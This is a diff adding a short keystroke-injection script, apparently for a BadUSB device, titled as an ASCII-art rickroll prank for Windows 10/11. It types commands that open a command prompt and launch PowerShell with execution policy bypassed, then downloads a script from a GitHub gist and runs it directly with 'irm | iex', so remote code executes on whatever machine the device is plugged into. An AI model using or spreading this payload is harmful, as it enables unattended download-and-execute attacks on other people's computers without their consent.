@@ -1,0 +1,16 @@
+REM Title: ASCII Art Rickroll Single-Line
+REM Author: Crane
+REM Description: Downloads and executes the ASCII animation script using a single command in Run dialog.
+REM Target: Windows 10/11
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING start conhost powershell -NoP -Ep Bypass -Command "$u='https://gist.githubusercontent.com/kcr4ne/a869fca9d103211352433c98ce3eddba/raw/5aec18ed7f44730c8ea788806752131553bee123/ascii_animation.ps1';irm $u|iex"
+ENTER
+DELAY 500
+STRING exit
+ENTER
